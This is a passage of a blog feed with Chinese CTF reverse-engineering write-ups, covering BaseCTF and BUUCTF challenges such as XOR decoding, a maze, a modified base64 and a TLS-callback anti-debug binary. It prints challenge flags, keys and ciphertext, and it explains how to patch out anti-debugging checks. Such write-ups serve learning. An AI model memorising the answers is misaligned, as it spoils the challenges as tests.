<span class="number">0x40</span>, <span class="number">0x3b</span>, <span class="number">0x25</span>, ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">28</span>):</span><br><span class="line">   flag +=<span class="built_in">chr</span>(i ^ enflag[<span class="number">27</span>-i] ^ key[i%<span class="number">3</span>] )</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment"># BaseCTF&#123;X0R_I5_345Y_F0r_y0U&#125; </span></span><br></pre></td></tr></table></figure><h3 id="ez-maze"><a href="#ez-maze" class="headerlink" title="ez_maze"></a>ez_maze</h3><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824200108696.png" alt="image-20240824200108696"></p><p>waï¼è¿·å®«ï¼</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824200625193.png" alt="image-20240824200625193"></p><p>å‡ºæ¥å•¦ï¼<code>sssssssddddwwwddsssssssdddsssddddd</code></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824200720082.png" alt="image-20240824200720082"></p><h3 id="BasePlus"><a href="#BasePlus" class="headerlink" title="BasePlus"></a>BasePlus</h3><p>çœ‹é¢˜ç›®ï¼Œçœ‹mainå‡½æ•°ï¼š</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824200822549.png" alt="image-20240824200822549"></p><p>encodeï¼šçœ‹ç€åƒbase64ï¼Œä½†æ˜¯Plusï¼ç»†ç»†çœ‹ï¼Œä¸åªæ˜¯æ¢äº†è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Encode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// r9</span></span><br><span class="line">  __int64 v5; <span class="comment">// r8</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ebp</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">bool</span> v12; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">bool</span> v13; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// [rsp+8h] [rbp-40h]</span></span><br><span class="line">  __int16 v15; <span class="comment">// [rsp+9h] [rbp-3Fh]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v16; <span class="comment">// [rsp+Bh] [rbp-3Dh]</span></span><br><span class="line">  <span class="type">char</span> v17[<span class="number">60</span>]; <span class="comment">// [rsp+Ch] [rbp-3Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(result) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v17;</span><br><span class="line">    v5 = <span class="number">4</span>i64;</span><br><span class="line">    v6 = <span class="number">0</span>i64;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v15 = <span class="number">0</span>;</span><br><span class="line">      v16 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = v7 + <span class="number">1</span>;</span><br><span class="line">        v11 = <span class="number">1</span>i64;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = v10;</span><br><span class="line">          *(&amp;v14 + v11) = a1[v10 - <span class="number">1</span>];</span><br><span class="line">          v12 = (<span class="type">int</span>)v11 &lt;= <span class="number">2</span>;</span><br><span class="line">          v13 = v3 &gt; (<span class="type">int</span>)v10++;</span><br><span class="line">          ++v11;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v13 &amp;&amp; v12 );</span><br><span class="line">      &#125;</span><br><span class="line">      v17[<span class="number">0</span>] = Secret[(<span class="type">unsigned</span> __int8)v15 &gt;&gt; <span class="number">2</span>];</span><br><span class="line">      v17[<span class="number">1</span>] = Secret[(HIBYTE(v15) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (_BYTE)v15) &amp; <span class="number">0x30</span>];</span><br><span class="line">      v17[<span class="number">2</span>] = Secret[(v16 &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * HIBYTE(v15)) &amp; <span class="number">0x3C</span>];</span><br><span class="line">      v17[<span class="number">3</span>] = Secret[v16 &amp; <span class="number">0x3F</span>];</span><br><span class="line">      v8 = v6;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        *(_BYTE *)(a2 + v8) = v4[v8] ^ <span class="number">0xE</span>;</span><br><span class="line">        ++v8;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v8 != v5 );</span><br><span class="line">      LODWORD(result) = v5;</span><br><span class="line">      v6 += <span class="number">4</span>i64;</span><br><span class="line">      v4 -= <span class="number">4</span>;</span><br><span class="line">      v5 += <span class="number">4</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &gt; v7 );</span><br><span class="line">  &#125;</span><br><span class="line">  result = (<span class="type">int</span>)result;</span><br><span class="line">  *(_BYTE *)(a2 + (<span class="type">int</span>)result) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824201050815.png" alt="image-20240824201050815"></p><p>æœç„¶ç»“æœå¼‚æˆ–0xE</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824201316243.png" alt="image-20240824201316243"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BaseCTF2024-Week1&quot;&gt;&lt;a href=&quot;#BaseCTF2024-Week1&quot; class=&quot;headerlink&quot; title=&quot;BaseCTF2024[Week1]&quot;&gt;&lt;/a&gt;BaseCTF2024[Week1]&lt;/h1&gt;&lt;h2 id=&quot;Rev</summary>
      
    
    
    
    
    <category term="CTF RE" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/CTF-RE/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF 2023 WEEK4|REVERSE kooh_slT</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/08/12/BUUCTF%202023%20WEEK4REVERSE%20kooh_slT/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/08/12/BUUCTF%202023%20WEEK4REVERSE%20kooh_slT/</id>
    <published>2024-08-11T16:00:00.000Z</published>
    <updated>2024-09-16T07:18:21.909Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF-2023-WEEK4-REVERSE-kooh-slT"><a href="#BUUCTF-2023-WEEK4-REVERSE-kooh-slT" class="headerlink" title="BUUCTF 2023 WEEK4|REVERSE kooh_slT"></a>BUUCTF 2023 WEEK4|REVERSE kooh_slT</h1><p>å‚è€ƒåšå®¢ï¼š<br><a href="http://www.chillysome.top/index.php/2024/03/15/tls%e5%9b%9e%e8%b0%83%e5%87%bd%e6%95%b0-%e4%b8%80%e6%96%87%e7%9c%8b%e6%87%82%ef%bc%88%e8%af%a6%ef%bc%89/">TLSå›è°ƒå‡½æ•°â€“ä¸€æ–‡çœ‹æ‡‚ï¼ˆè¯¦ï¼‰</a></p><p><a href="https://www.cnblogs.com/NozoMizo/articles/17788108.html">NewstarCTF2023 week4 re </a></p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><h4 id="mainå‡½æ•°ï¼š"><a href="#mainå‡½æ•°ï¼š" class="headerlink" title="mainå‡½æ•°ï¼š"></a>mainå‡½æ•°ï¼š</h4><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240811165013781.png" alt="image-20240811165013781"></p><blockquote><p> <code>calloc</code>ä¸ä»…åˆ†é…å†…å­˜ï¼Œè¿˜ä¼šå°†åˆ†é…çš„å†…å­˜åˆå§‹åŒ–ä¸º0ã€‚</p></blockquote><p>åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„çº¿ç¨‹ï¼Œçº¿ç¨‹çš„èµ·å§‹åœ°å€æ˜¯<code>StartAddress</code>å‡½æ•°ã€‚<code>CreateThread</code>å‡½æ•°è¿”å›çš„çº¿ç¨‹å¥æŸ„å­˜å‚¨åœ¨<code>hHandle</code>ä¸­</p><p>WaitForSingleObject(hHandle, 0xFFFFFFFF);</p><p>è¿™é‡Œçš„<code>WaitForSingleObject</code>å‡½æ•°ç”¨äºç­‰å¾…çº¿ç¨‹<code>hHandle</code>æ‰§è¡Œå®Œæ¯•ã€‚<code>0xFFFFFFFF</code>ï¼ˆå³<code>INFINITE</code>ï¼‰è¡¨ç¤ºæ— é™ç­‰å¾…ï¼Œç›´åˆ°çº¿ç¨‹æ‰§è¡Œå®Œæˆã€‚</p><p>sub401500æ˜æ˜¾æ˜¯base64</p><h4 id="è¿›å…¥StartAddressï¼š"><a href="#è¿›å…¥StartAddressï¼š" class="headerlink" title="è¿›å…¥StartAddressï¼š"></a>è¿›å…¥StartAddressï¼š</h4><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240811171621563.png" alt="image-20240811171621563"></p><p>åœ¨å£°æ˜å˜é‡ã€åˆ›å»ºå¿«ç…§ã€åˆå§‹åŒ–ä¹‹å</p><blockquote><p><code>CreateToolhelp32Snapshot</code> åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¿«ç…§ï¼Œå‚æ•° <code>2u</code> è¡¨ç¤ºå¿«ç…§ç±»å‹ä¸ºæ‰€æœ‰è¿›ç¨‹ã€‚å¦‚æœåˆ›å»ºå¤±è´¥ï¼ˆå³è¿”å› <code>INVALID_HANDLE_VALUE</code> æˆ– <code>(HANDLE)-1</code>ï¼‰ï¼Œå‡½æ•°ç›´æ¥è¿”å› <code>0</code>ï¼Œè¡¨ç¤ºå¤±è´¥ã€‚</p><p><code>pe.dwSize</code> å¿…é¡»è®¾ç½®ä¸º <code>PROCESSENTRY32W</code> ç»“æ„ä½“çš„å¤§å°ï¼Œä»¥ä¾¿è°ƒç”¨ <code>Process32FirstW</code> å‡½æ•°æ—¶æ­£ç¡®ä½¿ç”¨</p></blockquote><p>ä¼¼ä¹ä»€ä¹ˆéƒ½æ²¡æœ‰åšï¼Œçœ‹æ±‡ç¼–ï¼Œæœ‰ä¸€éƒ¨åˆ†æ˜¯ç°è‰²çš„ï¼ŒèŠ±æŒ‡ä»¤ï¼š</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240811172330917.png" alt="image-20240811172330917"></p><p>å…ˆæŠŠè·³è½¬å‡½æ•°nop</p><p>ç›´æ¥Crtl+Nå®¹æ˜“æŠŠåé¢ä¿¡æ¯ä¹Ÿnopäº†ï¼Œè¿™é‡Œshift+F2</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240811185021197.png" alt="image-20240811185021197"></p><p>å‰©äº†ç‚¹ï¼Œä¸€ä¼šé‡æ–°åˆ†æå°±å¥½ï¼ŒæŒ‰Cåˆ†æï¼Œä¸‹é¢è¿˜æœ‰ä¸€éƒ¨åˆ†</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240811185127542.png" alt="image-20240811185127542"></p><p>å…¨éƒ¨é‡æ–°åˆ†æåå¯ä»¥çœ‹åˆ°å®Œæ•´çš„å‡½æ•°ï¼š</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240811234931637.png" alt="image-20240811234931637"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hSnapshot = CreateToolhelp32Snapshot(<span class="number">2u</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( hSnapshot == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><blockquote><ul><li><code>CreateToolhelp32Snapshot</code> ä¼ å…¥çš„å‚æ•° <code>2u</code> è¡¨ç¤ºè·å–ç³»ç»Ÿä¸­æ‰€æœ‰çš„è¿›ç¨‹å¿«ç…§ã€‚æˆåŠŸæ—¶è¿”å›ä¸€ä¸ªå¿«ç…§å¥æŸ„ï¼Œå¤±è´¥æ—¶è¿”å› <code>INVALID_HANDLE_VALUE</code> (é€šå¸¸ä¸º <code>(HANDLE)-1</code>)ã€‚</li><li>å¦‚æœ <code>CreateToolhelp32Snapshot</code> è¿”å› <code>-1</code>ï¼Œå‡½æ•°ç«‹å³è¿”å› <code>0</code>ï¼Œè¡¨ç¤ºå¤±è´¥ã€‚</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( Process32FirstW(hSnapshot, &amp;pe) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">      <span class="comment">//åœ¨æ¯æ¬¡å¾ªç¯ä¸­ï¼Œä»£ç é€šè¿‡ `wcscmp` æ¯”è¾ƒå½“å‰è¿›ç¨‹åç§° `pe.szExeFile` ä¸å­˜å‚¨åœ¨ `word_4A7010` çš„9ä¸ªè¿›ç¨‹åç§°ï¼ˆæ¯ä¸ªåç§°é•¿åº¦ä¸º50ä¸ªå­—èŠ‚ï¼‰è¿›è¡Œæ¯”è¾ƒ</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">9</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">     wcscmp(pe.szExeFile, (<span class="type">const</span> <span class="type">wchar_t</span> *)&amp;word_4A7010[<span class="number">50</span> * i]);</span><br><span class="line">    OpenProcess(<span class="number">0x1FFFFF</span>u, <span class="number">0</span>, pe.th32ProcessID);<span class="comment">//è°ƒç”¨ `OpenProcess` å°è¯•æ‰“å¼€è¿›ç¨‹ï¼Œæ ‡å¿—å€¼ `0x1FFFFFu` ä»£è¡¨æ‰€éœ€çš„æ‰€æœ‰è®¿é—®æƒé™ã€‚</span></span><br><span class="line">  &#125;</span><br><span class="line">    <span class="comment">//åœ¨å¾ªç¯ç»“æŸåï¼ˆå³æ²¡æœ‰åŒ¹é…çš„è¿›ç¨‹åï¼‰ï¼Œå…³é—­å¿«ç…§å¥æŸ„ï¼Œå¹¶è°ƒç”¨ `sub_401500` è¿›è¡Œè¿›ä¸€æ­¥çš„å¤„ç†ï¼Œç„¶åè¿”å› `1`ï¼Œè¡¨ç¤ºæˆåŠŸã€‚</span></span><br><span class="line">  <span class="keyword">while</span> ( Process32NextW(hSnapshot, &amp;pe) );</span><br><span class="line">  CloseHandle(hSnapshot);</span><br><span class="line">  sub_401500(byte_4A7E74, dword_4A7E70, Str1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//å¦‚æœ `Process32FirstW` å¤±è´¥ï¼Œè¡¨ç¤ºæ²¡æœ‰è¿›ç¨‹ä¿¡æ¯å¯æšä¸¾ï¼Œç›´æ¥å…³é—­å¥æŸ„å¹¶è¿”å› `0`ã€‚</span></span><br><span class="line">&#123;</span><br><span class="line">  CloseHandle(hSnapshot);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼¼ä¹ä¸­é—´æœ‰ä¸ªæ­»å¾ªç¯ï¼Œæ€ªä¸å¾—åŠ¨è°ƒäº†ä¸€é˜µå­éƒ½åŠ¨ä¸äº†â€¦â€¦</p><p>å†æ”¹ï¼š</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812003624975.png" alt="image-20240812003624975"></p><p>ç»ˆäºå¯¹äº†ï¼š<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812004235808.png" alt="image-20240812004235808"></p><p>é¢˜ç›®æ˜¯TLSï¼Œçœ‹æ—è¾¹å‡½æ•°</p><h4 id="TlsCallback-0ï¼š"><a href="#TlsCallback-0ï¼š" class="headerlink" title="TlsCallback_0ï¼š"></a>TlsCallback_0ï¼š</h4><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812000053323.png" alt="image-20240812000053323"></p><p>å­¦åˆ°ä¸€ä¸ªå¾ˆå¥½çš„ä¿®æ”¹æ£€æµ‹åè°ƒè¯•æ–¹æ³•ï¼š</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812000405368.png" alt="image-20240812000405368"></p><blockquote><p> å¸ˆå‚…è¯´ï¼šï¼ˆè®°ç¬”è®°ï¼‰<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812000131184.png" alt="image-20240812000131184"></p></blockquote><p>ä¸å¤ªæ‡‚TLScallbackï¼Œå»ç½‘ä¸Šæœç´¢</p><p>é¦–å…ˆæ˜¯TLSï¼š</p><blockquote><p>Thread Local Storageï¼Œçº¿ç¨‹å±€éƒ¨å­˜å‚¨ï¼šå„çº¿ç¨‹ç‹¬ç«‹çš„æ•°æ®å­˜å‚¨ç©ºé—´ã€‚ä½¿ç”¨TLSæŠ€æœ¯å¯ä»¥åœ¨çº¿ç¨‹å†…éƒ¨ç‹¬ç«‹ä½¿ç”¨æˆ–ä¿®æ”¹è¿›ç¨‹çš„å…¨å±€æ•°æ®æˆ–é™æ€æ•°æ®ï¼Œ å°±åƒå¯¹å¾…è‡ªèº«çš„å±€éƒ¨å˜é‡ä¸€æ ·</p><p>TLSå›è°ƒå‡½æ•°å¸¸ç”¨äºåè°ƒè¯•ï¼Œä¸»è¦æ˜¯åˆ©ç”¨äº†TLSå›è°ƒå‡½æ•°çš„è°ƒç”¨è¦å…ˆäºEPä»£ç çš„æ‰§è¡Œ</p><p>å¦‚æœå¼€å¯äº†TLSåŠŸèƒ½ï¼ŒPEæ–‡ä»¶å¤´å°±ä¼šè®¾ç½®TLSè¡¨ï¼ŒIMAGE_NT_HEADERS-IMAGE_OPTIONAL_HEADER-IMAGE_DATA_DIRECTORY[9]æè¿°äº†IMAGE_TLS_DIRECTORYç»“æ„ä½“çš„ä½ç½®ã€‚</p><p># ä½œè€…(Author)ï¼šchillysome<br># é“¾æ¥(URL)ï¼š<a href="http://www.chillysome.top/index.php/2024/03/15/tls%e5%9b%9e%e8%b0%83%e5%87%bd%e6%95%b0-%e4%b8%80%e6%96%87%e7%9c%8b%e6%87%82%ef%bc%88%e8%af%a6%ef%bc%89/">http://www.chillysome.top/index.php/2024/03/15/tls%e5%9b%9e%e8%b0%83%e5%87%bd%e6%95%b0-%e4%b8%80%e6%96%87%e7%9c%8b%e6%87%82%ef%bc%88%e8%af%a6%ef%bc%89/</a></p></blockquote><p>æ‰€ä»¥ä¸Šé¢whileå¾ªç¯æœ‰9æ¬¡ï¼Œä¼¼ä¹ä¹Ÿæœ‰äº›å…³ç³»</p><p>ç»§ç»­æœï¼ŒTLSå›è°ƒå‡½æ•°ï¼Œæ¯å½“åˆ›å»ºæˆ–ç»ˆæ­¢è¿›ç¨‹çš„çº¿ç¨‹æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨æ‰§è¡Œçš„å‡½æ•°ã€‚</p><p>å‚æ•°é¡ºåºå’Œå®šä¹‰æ˜¯ä¸€æ ·çš„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ¨¡å—å¥æŸ„ã€ç¬¬äºŒä¸ªæ ‡è¯†è°ƒç”¨TLSå›è°ƒå‡½æ•°åŸå› ï¼Œæœ‰4ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_PROCESS_ATTACH 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_THREAD_ATTACH 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_THREAD_DETACH 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_PROCESS_ATTACH 0</span></span><br><span class="line"><span class="comment">//ä¸»çº¿ç¨‹è°ƒç”¨mainå‰è°ƒç”¨TLSå›è°ƒå‡½æ•°ï¼Œè°ƒç”¨åŸå› ä¸ºDLL_PROCESS_ATTACH</span></span><br><span class="line"><span class="comment">//å­çº¿ç¨‹å¯åŠ¨å‰è°ƒç”¨TLSï¼ŒåŸå› ä¸ºDLL_THREAD_ATTACH</span></span><br><span class="line"><span class="comment">//å­çº¿ç¨‹ç»“æŸåè°ƒç”¨TLSï¼ŒåŸå› ä¸ºDLL_THREAD_DETACH</span></span><br><span class="line"><span class="comment">//ä¸»çº¿ç¨‹ç»“æŸåè°ƒç”¨TLS åŸå› ä¸ºDLL_PROCESS_DETACH</span></span><br></pre></td></tr></table></figure><p>è€Œè¿è¡Œæ—¶è°ƒç”¨é¡ºåºï¼Œ1â€“2â€“3â€“0</p><h3 id="è¿è¡Œæµç¨‹ï¼š"><a href="#è¿è¡Œæµç¨‹ï¼š" class="headerlink" title="è¿è¡Œæµç¨‹ï¼š"></a>è¿è¡Œæµç¨‹ï¼š</h3><ul><li>è¿›å…¥case1ï¼Œæ£€æµ‹è°ƒè¯•å™¨ï¼Œå­˜åœ¨åˆ™å¡æ­»è¿›ç¨‹ï¼›é€šè¿‡mainå‡½æ•°ä¸­CreateThreadï¼Œæ¥ç€WaitForSingleObjectç­‰å¾…çº¿ç¨‹ç»“æŸ</li><li>çº¿ç¨‹è¿›å…¥case2ï¼Œååè°ƒè¯•æ£€æ“¦ï¼Œæ¥ç€å¯¹sub_4a7000ä¿®æ”¹ï¼ŒåŠ¨è°ƒè¿›å…¥sub_4013B0è¿è¡Œå–å‡ºkeyï¼›æ¥ç€è°ƒç”¨sub_401500è¿›å…¥sub_401170ï¼Œbase64åŠ å¯†</li><li>è¿›å…¥case3ï¼Œsub_401500çš„è°ƒç”¨æ”¹ä¸ºsub_4013B0</li><li>é€€å‡ºçº¿ç¨‹ï¼Œè¿›å…¥mainä¸­sub_401500ï¼Œè¿›è¡ŒxxteaåŠ å¯†ï¼Œæ¯”è¾ƒä¸ç›¸åŒï¼Œé€€å‡ºè¿›ç¨‹</li><li>è¿›å…¥case0ï¼ŒTLSæœ€åçš„checkå‡½æ•°ï¼Œæ£€æµ‹åè¾“å‡ºTrue</li></ul><h4 id="åŠ¨è°ƒï¼š"><a href="#åŠ¨è°ƒï¼š" class="headerlink" title="åŠ¨è°ƒï¼š"></a>åŠ¨è°ƒï¼š</h4><p>ï¼ˆä¸€å®šè¦åº”ç”¨ä¿®æ”¹äºç¨‹åºâ€¦â€¦ï¼ˆEditâ€“&gt;</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812010612755.png" alt="image-20240812010612755"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812011907961.png" alt="image-20240812011907961"></p><p>Qu7e3T0yEknVghYa6vf1oOsF94H+LxIqbtKpzw8U5CJN2XlZRPM&#x2F;SdAWDGcjBimr</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812012210949.png" alt="image-20240812012210949"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812012718410.png" alt="image-20240812012718410"></p><p>å‘ç°è·³è½¬è‡³4013B0,</p><p>På‘½ä»¤æ„å»ºå‡½æ•°ï¼Œæ˜¯xxteaåŠ å¯†ï¼Œ</p><p>å–å‡ºkeyï¼š</p><p>0x74,0x404,0xBF,0x2652</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812011228728.png" alt="image-20240812011228728"></p><p>å–å‡ºå¯†æ–‡ï¼š</p><p>dd 3400A0D0h, 0B23CFFEBh, 0CDE69111h, 32D0771h, 0FA1D9E6Ch<br>.data:004A7450                 dd 9D15360Ah, 933EBF03h, 9F12DDA6h, 8C58DDA1h, 46BEE3E0h<br>.data:004A7464                 dd 4476F65h, 3C44CEF9h</p><p>é¡ºåºæ±‚è§£å°±ok</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BUUCTF-2023-WEEK4-REVERSE-kooh-slT&quot;&gt;&lt;a href=&quot;#BUUCTF-2023-WEEK4-REVERSE-kooh-slT&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF 2023 WEEK4|REVERS</summary>
      
    
    
    
    
    <category term="CTF TLS" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/CTF-TLS/"/>
    
  </entry>
  
  <entry>
    <title>è¥¿ç“œæ¯</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/07/09/%E8%A5%BF%E7%93%9C%E6%9D%AF/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/07/09/%E8%A5%BF%E7%93%9C%E6%9D%AF/</id>
    <published>2024-07-08T16:00:00.000Z</published>
    <updated>2024-09-16T07:17:41.504Z</updated>
    
    <content type="html"><![CDATA[<h1 id="è¥¿ç“œæ¯"><a href="#è¥¿ç“œæ¯" class="headerlink" title="è¥¿ç“œæ¯"></a>è¥¿ç“œæ¯</h1><p><a href="https://ctf.show/challenges#%E8%A5%BF%E7%93%9C%E6%9D%AF%E5%AE%98%E6%96%B9wp-4415">æ¯”èµ›å¹³å°</a></p><p><a href="https://docs.qq.com/doc/DRmVUb1lOdmFMYmx1">wp</a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ä»–è¯´ä»–æƒ³ç»“å©š"><a href="#ä»–è¯´ä»–æƒ³ç»“å©š" class="headerlink" title="ä»–è¯´ä»–æƒ³ç»“å©š"></a>ä»–è¯´ä»–æƒ³ç»“å©š</h3><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="å¥‡æ€ªçš„æ¡å½¢ç "><a href="#å¥‡æ€ªçš„æ¡å½¢ç " class="headerlink" title="å¥‡æ€ªçš„æ¡å½¢ç "></a>å¥‡æ€ªçš„æ¡å½¢ç </h3><p>ä¸€é“miscï¼Œï¼Œpptæ”¹å›¾ç‰‡é•¿æ¬¾</p><h3 id="ç®€å•å¯†ç "><a href="#ç®€å•å¯†ç " class="headerlink" title="ç®€å•å¯†ç "></a>ç®€å•å¯†ç </h3><p>æ²¡çœ‹å‡ºæ¥</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 